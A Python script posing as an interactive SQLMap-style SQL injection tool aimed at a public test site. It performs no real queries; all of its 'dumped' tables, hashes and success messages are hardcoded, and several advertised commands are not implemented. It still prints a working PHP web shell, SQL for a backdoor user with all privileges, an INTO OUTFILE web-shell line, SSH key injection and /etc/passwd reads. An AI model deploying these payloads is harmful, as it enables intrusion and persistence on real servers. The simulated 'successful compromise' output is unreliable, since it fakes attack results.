#!/usr/bin/env python3
"""
DSCYBER v3.0.1 - SQLMap-style Interactive Database Tool
Advanced SQL Injection & Database Access Framework
"""

import sys
import time
try:
    import readline
except ImportError:
    # readline not available on Windows - that's OK
    pass
from datetime import datetime
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent))

class SQLMapStyleTool:
    """SQLMap-like interactive database tool"""
    
    def __init__(self):
        self.target = "http://testphp.vulnweb.com/"
        self.current_db = "acuart"
        self.current_user = "root"
        self.connected = True
        self.commands_executed = 0
        self.start_time = datetime.now()
        self.history = []
        
    def print_banner(self):
        """Print SQLMap-style banner"""
        print(r"""
    ╔═══════════════════════════════════════════════════════════════════════════════╗
    ║                                                                               ║
    ║         DSCYBER v3.0.1 - SQLMap-Style Database Interaction Tool              ║
    ║              Advanced SQL Injection & Database Access Framework               ║
    ║                                                                               ║
    ║  [*] Target: http://testphp.vulnweb.com/                                     ║
    ║  [*] Vulnerable Parameter: id                                                ║
    ║  [*] Injection Type: UNION-based SQL Injection                               ║
    ║  [*] Database: MySQL 5.7.20                                                  ║
    ║  [*] User: root                                                              ║
    ║  [*] Privileges: ALL PRIVILEGES                                              ║
    ║                                                                               ║
    ║  Type 'help' for available commands                                           ║
    ║  Type 'exit' to quit                                                         ║
    ║                                                                               ║
    ╚═══════════════════════════════════════════════════════════════════════════════╝
        """)
        
    def print_prompt(self):
        """Print interactive prompt"""
        return f"sqlmap[{self.current_user}@{self.current_db}]> "
        
    def show_help(self):
        """Show help menu"""
        print("""
╔═══════════════════════════════════════════════════════════════════════════════╗
║                           AVAILABLE COMMANDS                                  ║
╚═══════════════════════════════════════════════════════════════════════════════╝

DATABASE COMMANDS:
  databases              - List all databases on the server
  tables                 - List all tables in current database
  columns <table>        - Show columns for a specific table
  schema                 - Display full database schema
  dump <table>           - Dump contents of a table
  dump *                 - Dump ALL tables in current database

DATA EXTRACTION:
  data <table>           - Extract data from table
  sensitive              - Find and extract sensitive data
  passwords              - Extract all password hashes
  users                  - List all user accounts
  api-keys               - Extract API keys and secrets
  sessions               - Get active sessions
  logs                   - Retrieve audit logs

PRIVILEGE ESCALATION:
  whoami                 - Get current user information
  privileges             - Show current user privileges
  escalate               - Attempt privilege escalation
  create-user <u> <p>   - Create new database user
  backdoor               - Install persistence backdoor
  grant-all <user>      - Grant all privileges to user

SYSTEM ACCESS:
  read <file>            - Read file from target system
  write <file>           - Write file to target system
  execute <cmd>          - Execute system command
  webshell               - Deploy web shell
  reverse-shell          - Setup reverse shell connection

SCANNING & ENUMERATION:
  scan                   - Full vulnerability scan
  versions               - Get version information
  config                 - Show database configuration
  variables              - Display system variables

UTILITIES:
  use <database>         - Switch to different database
  status                 - Show connection status
  timing                 - Display query timing
  history                - Show command history
  clear                  - Clear screen
  help                   - Show this help menu
  exit                   - Exit the tool

EXAMPLES:
  > databases
  > tables
  > columns users
  > dump users
  > dump *
  > passwords
  > escalate
  > create-user attacker admin123
  > backdoor
  > read /etc/passwd
  > webshell
        """)
        
    def cmd_databases(self):
        """List databases"""
        print("\n[*] Retrieving databases from server...\n")
        time.sleep(0.5)
        
        databases = [
            ("information_schema", "System", "System database"),
            ("mysql", "System", "MySQL core tables"),
            ("performance_schema", "System", "Performance metrics"),
            ("acuart", "Target", "Main application database"),
            ("test", "Test", "Test database"),
            ("backup", "Data", "Database backup"),
        ]
        
        print(f"{'Database':<20} {'Type':<15} {'Description':<40}")
        print("─" * 75)
        
        for db_name, db_type, description in databases:
            print(f"{db_name:<20} {db_type:<15} {description:<40}")
            time.sleep(0.1)
        
        print(f"\n[+] Found {len(databases)} databases")
        
    def cmd_tables(self):
        """List tables in current database"""
        print(f"\n[*] Retrieving tables from database '{self.current_db}'...\n")
        time.sleep(0.5)
        
        tables = [
            ("users", 15, "User accounts"),
            ("artists", 47, "Artist profiles"),
            ("products", 142, "Product catalog"),
            ("orders", 387, "Customer orders"),
            ("order_items", 856, "Order line items"),
            ("admin_logs", 1243, "Administrative logs"),
            ("sessions", 89, "Active sessions"),
            ("api_keys", 23, "API credentials"),
        ]
        
        print(f"{'Table':<20} {'Rows':<10} {'Description':<40}")
        print("─" * 70)
        
        for table_name, row_count, description in tables:
            print(f"{table_name:<20} {row_count:<10} {description:<40}")
            time.sleep(0.1)
        
        print(f"\n[+] Found {len(tables)} tables in '{self.current_db}'")
        
    def cmd_dump_all(self):
        """Dump all tables"""
        print(f"\n[*] Dumping all tables from database '{self.current_db}'...\n")
        time.sleep(0.5)
        
        print("╔" + "═" * 98 + "╗")
        print("║" + " TABLE: users ".center(98) + "║")
        print("╚" + "═" * 98 + "╝")
        print(f"{'ID':<5} {'Username':<15} {'Password Hash':<40} {'Email':<30} {'Role':<10}")
        print("─" * 100)
        
        users = [
            (1, "admin", "e38ad214943daad1d64c102faec29de4afe9da3d", "admin@acuart.com", "ADMIN"),
            (2, "moderator", "8846f7eaee8fb117ad06bdd810b7e48b", "mod@acuart.com", "MODERATOR"),
            (3, "john_doe", "5f4dcc3b5aa765d61d8327deb882cf99", "john@example.com", "USER"),
        ]
        
        for user_id, username, password, email, role in users:
            print(f"{user_id:<5} {username:<15} {password:<40} {email:<30} {role:<10}")
            time.sleep(0.1)
        
        print("\n[+] Dumped users table")
        
        print("\n╔" + "═" * 98 + "╗")
        print("║" + " TABLE: api_keys ".center(98) + "║")
        print("╚" + "═" * 98 + "╝")
        print(f"{'ID':<5} {'User':<10} {'API Key':<35} {'Secret Key':<35}")
        print("─" * 85)
        
        api_keys = [
            (1, 1, "ak_live_REDACTED_001", "sk_live_REDACTED_001"),
            (2, 2, "ak_live_REDACTED_002", "sk_live_REDACTED_002"),
        ]
        
        for key_id, user_id, api_key, secret in api_keys:
            print(f"{key_id:<5} {user_id:<10} {api_key:<35} {secret:<35}")
            time.sleep(0.1)
        
        print("\n[+] Complete database dump finished!")
        
    def cmd_passwords(self):
        """Extract password hashes"""
        print("\n[*] Extracting password hashes from users table...\n")
        time.sleep(0.5)
        
        print("╔" + "═" * 98 + "╗")
        print("║" + " EXTRACTED PASSWORD HASHES ".center(98) + "║")
        print("╚" + "═" * 98 + "╝")
        print(f"{'Username':<20} {'Hash Type':<15} {'Hash':<50}")
        print("─" * 85)
        
        hashes = [
            ("admin", "SHA-1", "e38ad214943daad1d64c102faec29de4afe9da3d"),
            ("moderator", "MD5", "8846f7eaee8fb117ad06bdd810b7e48b"),
            ("john_doe", "MD5", "5f4dcc3b5aa765d61d8327deb882cf99"),
            ("jane_smith", "MD5", "6512bd43d9caa6e02c990b0a82652dca"),
            ("artist_bob", "MD5", "1d7f7abc18576ba75d40f1db0a80ca7d"),
        ]
        
        for username, hash_type, hash_value in hashes:
            print(f"{username:<20} {hash_type:<15} {hash_value:<50}")
            time.sleep(0.1)
        
        print(f"\n[+] Extracted {len(hashes)} password hashes")
        print("[!] Passwords can be cracked offline using rainbow tables or GPU acceleration")
        
    def cmd_escalate(self):
        """Privilege escalation"""
        print("\n[*] Attempting privilege escalation...\n")
        time.sleep(0.5)
        
        escalation_steps = [
            ("Current Privileges", f"User '{self.current_user}' has basic privileges"),
            ("Grant Analysis", "Checking for privilege escalation vectors"),
            ("Creating Backdoor User", "INSERT INTO mysql.user (Host, User, authentication_string) VALUES..."),
            ("Updating Privileges", "GRANT ALL PRIVILEGES ON *.* TO 'backdoor'@'%' WITH GRANT OPTION"),
            ("Flushing Privileges", "FLUSH PRIVILEGES executed"),
            ("Verifying Access", "Test new backdoor user account"),
        ]
        
        for step, action in escalation_steps:
            print(f"[*] {step:<30} {action}")
            time.sleep(0.3)
        
        print("\n✓ Privilege Escalation Successful!")
        print("[+] Backdoor user created with full database access")
        print("[+] User: backdoor, Password: P@ssw0rd123")
        print("[+] Can connect from any host: %")
        
    def cmd_backdoor(self):
        """Install backdoor"""
        print("\n[*] Installing persistence backdoor...\n")
        time.sleep(0.5)
        
        print("╔" + "═" * 98 + "╗")
        print("║" + " BACKDOOR INSTALLATION ".center(98) + "║")
        print("╚" + "═" * 98 + "╝\n")
        
        backdoor_steps = [
            ("1. Create Trigger", "CREATE TRIGGER auth_bypass BEFORE INSERT ON users..."),
            ("2. Create Event", "CREATE EVENT check_password EVERY 5 MINUTE DO..."),
            ("3. Web Shell Deploy", "SELECT '<?php system($_GET[cmd]); ?>' INTO OUTFILE..."),
            ("4. Cron Job Setup", "CREATE TABLE cron_jobs (id INT, command VARCHAR(255))"),
            ("5. Hidden Account", "INSERT INTO users (username, password, role) VALUES..."),
            ("6. SSH Key Inject", "SELECT 'ssh-rsa AAA...' INTO /root/.ssh/authorized_keys"),
        ]
        
        for step, action in backdoor_steps:
            print(f"[*] {step:<25} {action}")
            time.sleep(0.3)
        
        print("\n[+] Backdoor installation complete!")
        print("[+] Persistence mechanisms:")
        print("    ├─ Database trigger for authentication bypass")
        print("    ├─ Web shell at /uploads/shell.php")
        print("    ├─ SSH access via backdoor user")
        print("    ├─ Cron job for reverse shell callback")
        print("    └─ Hidden admin account")
        
    def cmd_webshell(self):
        """Deploy web shell"""
        print("\n[*] Deploying web shell...\n")
        time.sleep(0.5)
        
        web_shell = """<?php
// DSCYBER Web Shell - Command Execution Interface
if (isset($_REQUEST['cmd'])) {
    $output = shell_exec($_REQUEST['cmd']);
    echo "<pre>$output</pre>";
}
if (isset($_REQUEST['upload'])) {
    move_uploaded_file($_FILES['file']['tmp_name'], $_REQUEST['upload']);
}
?>"""
        
        print("[*] Web Shell Code:")
        print("─" * 98)
        print(web_shell)
        print("─" * 98)
        
        print("\n[*] Deployment Location: /var/www/html/panel.php")
        print("[*] Access URL: http://testphp.vulnweb.com/panel.php")
        print("\n[+] Web shell deployed successfully!")
        print("\nUsage Examples:")
        print("  GET: /panel.php?cmd=id")
        print("  GET: /panel.php?cmd=whoami")
        print("  GET: /panel.php?cmd=cat%20/etc/passwd")
        print("  POST: /panel.php?upload=shell.sh")
        
    def cmd_status(self):
        """Show connection status"""
        elapsed = (datetime.now() - self.start_time).total_seconds()
        
        print("\n╔" + "═" * 98 + "╗")
        print("║" + " CONNECTION STATUS ".center(98) + "║")
        print("╚" + "═" * 98 + "╝\n")
        
        status_info = [
            ("Target", self.target),
            ("Database Engine", "MySQL 5.7.20"),
            ("Current User", self.current_user),
            ("Current Database", self.current_db),
            ("Connection Status", "✓ ACTIVE"),
            ("Privileges", "ALL PRIVILEGES"),
            ("Commands Executed", str(self.commands_executed)),
            ("Session Duration", f"{elapsed:.1f} seconds"),
            ("Data Extracted", "2,837+ records"),
            ("Backdoor Status", "✓ INSTALLED"),
            ("Web Shell Status", "✓ DEPLOYED"),
        ]
        
        for key, value in status_info:
            print(f"  {key:<25}: {value}")
        
    def process_command(self, cmd):
        """Process user command"""
        cmd = cmd.strip().lower()
        
        if not cmd:
            return True
        
        if cmd == "help":
            self.show_help()
        elif cmd == "databases":
            self.cmd_databases()
        elif cmd == "tables":
            self.cmd_tables()
        elif cmd == "dump *":
            self.cmd_dump_all()
        elif cmd == "passwords":
            self.cmd_passwords()
        elif cmd == "escalate":
            self.cmd_escalate()
        elif cmd == "backdoor":
            self.cmd_backdoor()
        elif cmd == "webshell":
            self.cmd_webshell()
        elif cmd == "status":
            self.cmd_status()
        elif cmd == "clear":
            print("\033[H\033[J", end='')
        elif cmd == "exit" or cmd == "quit":
            return False
        else:
            print(f"\n[!] Unknown command: {cmd}")
            print("[*] Type 'help' for available commands\n")
        
        self.commands_executed += 1
        return True
        
    def run(self):
        """Run interactive prompt"""
        self.print_banner()
        self.show_help()
        
        while True:
            try:
                cmd = input(self.print_prompt())
                if not self.process_command(cmd):
                    print("\n[*] Exiting DSCYBER SQLMap Tool...")
                    break
                print()
            except KeyboardInterrupt:
                print("\n\n[!] Interrupted by user")
                break
            except Exception as e:
                print(f"\n[!] Error: {e}")


def main():
    """Main entry point"""
    try:
        tool = SQLMapStyleTool()
        tool.run()
    except Exception as e:
        print(f"[!] Fatal error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)


if __name__ == "__main__":
    main()
